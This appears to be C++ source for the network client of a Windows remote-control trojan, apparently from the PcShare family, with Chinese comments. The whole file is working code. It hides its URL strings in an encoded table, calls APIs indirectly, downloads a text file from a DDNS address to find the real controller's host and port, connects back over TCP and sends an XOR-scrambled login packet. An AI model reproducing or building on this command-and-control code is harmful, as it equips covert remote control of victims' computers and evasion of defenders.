// MyTrans.cpp: implementation of the CMyClientTran class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyClientTran.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyClientTran::CMyClientTran()
{
	m_Socket = NULL;
	m_gFunc.memset(m_Addr, 0, sizeof(m_Addr));
	m_Port = 0;
}

CMyClientTran::~CMyClientTran()
{
	Close();
}

DWORD CMyClientTran::GetIpLong(LPCTSTR pServerAddr)
{
	char m_RealIp[MAX_PATH] = {0};
	m_gFunc.strcpy(m_RealIp, pServerAddr);
	DWORD dIp = inet_addr(m_RealIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_RealIp);
		if(hostinfo != NULL)
		{
			struct sockaddr_in dest = {0};
			m_gFunc.memcpy(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
			dIp = (ULONG) inet_addr(inet_ntoa(dest.sin_addr));
		}
	}
	return dIp;
}

BOOL CMyClientTran::GetRealServerInfo(char* m_DdnsUrl, char* pServerAddr, UINT* pServerPort)
{
	char m_FileName[MAX_PATH] = {0};
	char m_Url[1024] = {0};

	//http://%s
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10203, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.sprintf(m_Url, m_TmpStr, m_DdnsUrl);

	//%08x.txt
	m_gFunc.GetMyString(10204, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.GetTempPath(250, m_FileName);
	m_gFunc.sprintf(m_FileName + m_gFunc.strlen(m_FileName), m_TmpStr, m_gFunc.GetCurrentThreadId());
	if(!GetUrlFile(m_Url, m_FileName))
	{
		return FALSE;
	}

	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	DWORD nFileLen = m_gFunc.GetFileSize(hFile, NULL);
	char* pFileBuf = new char[nFileLen];
	m_gFunc.ReadFile(hFile, pFileBuf, nFileLen, &nReadLen, NULL);
	m_gFunc.CloseHandle(hFile);
	m_gFunc.DeleteFile(m_FileName);

	//取掉末尾
	char* pDot = m_gFunc.strchr(pFileBuf , '\r');
	if(pDot != NULL)
	{
		*pDot = 0;
	}
	pDot = m_gFunc.strchr(pFileBuf , '\n');
	if(pDot != NULL)
	{
		*pDot = 0;
	}

	pDot = m_gFunc.strchr(pFileBuf , ':');
	if(pDot == NULL) 
	{
		m_gFunc.strcpy(pServerAddr, pFileBuf);
		*pServerPort = 80;
		delete [] pFileBuf;
		return TRUE;
	}

	*pDot = 0;
	m_gFunc.strcpy(pServerAddr, pFileBuf);
	*pServerPort = m_gFunc.atoi(pDot + 1);
	delete [] pFileBuf;
	return TRUE;
}

BOOL CMyClientTran::GetUrlFile(char* pUrlPath, char* m_FilePath)
{
	BOOL bIsSuccess = FALSE;

	//初始化HTTP环境
	HINTERNET hIe = m_gFunc.InternetOpen("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if(!hIe) 
	{
		return FALSE;
	}

	//建立HTTP连接,上送数据
	HINTERNET hFp = m_gFunc.InternetOpenUrl(hIe, pUrlPath, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD, 0);
	if(!hFp)
	{
		m_gFunc.InternetCloseHandle(hIe);
		return FALSE; 
	}

	//200
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10205, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//查看返回码
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!m_gFunc.HttpQueryInfo(hFp, HTTP_QUERY_STATUS_CODE, sCode, &nSize, &nIndex) || m_gFunc.strcmp(sCode, m_TmpStr))
	{
		m_gFunc.InternetCloseHandle(hFp);
		m_gFunc.InternetCloseHandle(hIe);
		return FALSE;
	}

	HANDLE hFile = m_gFunc.CreateFile(m_FilePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_gFunc.InternetCloseHandle(hFp);
		m_gFunc.InternetCloseHandle(hIe);
		return FALSE;
	}
	
	BYTE  pDatabuf[4096] = {0};
	DWORD dwNumberOfBytesReaded = 0;
	DWORD nWriteLen = 0;
	while(1)
	{
		if(!m_gFunc.InternetReadFile(hFp, pDatabuf, 4000, &dwNumberOfBytesReaded))
		{
			break;
		}
		if(dwNumberOfBytesReaded == 0)
		{
			bIsSuccess = TRUE; 
			break;
		}
		else
		{
			m_gFunc.WriteFile(hFile, pDatabuf, dwNumberOfBytesReaded, &nWriteLen, NULL);
		}
	}

	m_gFunc.CloseHandle(hFile);
	m_gFunc.InternetCloseHandle(hFp);
	m_gFunc.InternetCloseHandle(hIe);
	return bIsSuccess;
}

BOOL CMyClientTran::Create(DWORD nCmd, char* m_ServerAddr, UINT m_ServerPort, char* pUrl, UINT nPassWord)
{
	Close();

	m_gFunc.strcpy(m_Addr, m_ServerAddr);
	m_Port = m_ServerPort;

	//查看是否有ddns
	if(m_gFunc.strlen(pUrl) != 0)
	{
		GetRealServerInfo(pUrl, m_Addr, &m_Port);
	}

	//连接到服务器
	m_Socket = GetConnectSocket(m_Addr, m_Port);
	if(m_Socket == NULL)
	{
		return FALSE;
	}
	
	//协商初始数据
	LOGININFO m_LoginInfo = {0};
	m_LoginInfo.m_Cmd = nCmd;
	m_LoginInfo.m_hWnd = (HWND) nPassWord;
	m_LoginInfo.m_UserId = PS_USER_ID;
	EncryptByte(&m_LoginInfo, sizeof(LOGININFO));
	return SendData(&m_LoginInfo, sizeof(LOGININFO));
}

void CMyClientTran::EncryptByte(LPVOID pData, DWORD nLen)
{
	BYTE* pTmpData = (BYTE*) pData;
	for(DWORD i = 0; i < nLen; i++)
	{
		pTmpData[i] = pTmpData[i] ^ PS_ENTRY_COMM_KEY;	
	}
}

void CMyClientTran::Close()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
		m_Socket = NULL;
	}
	m_gFunc.memset(m_Addr, 0, sizeof(m_Addr));
	m_Port = 0;
}

SOCKET CMyClientTran::GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	char m_sServerIp[MAX_PATH] = {0};
	m_gFunc.strcpy(m_sServerIp, pServerAddr);
	DWORD dIp = inet_addr(m_sServerIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_sServerIp);
		if(hostinfo == NULL)
		{
			return NULL;
		}
		struct sockaddr_in dest = {0};
		m_gFunc.memcpy(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
		m_gFunc.strcpy(m_sServerIp, inet_ntoa(dest.sin_addr));
	}

	//初始化连接信息
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sServerIp);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET;

	//创建发送套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		return NULL;
	}
	
	//连接客户计算机
	if(connect(m_Socket, (sockaddr*)& m_ServerAddr, m_AddrLen) == SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	const int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	//连接成功
	return m_Socket;
}

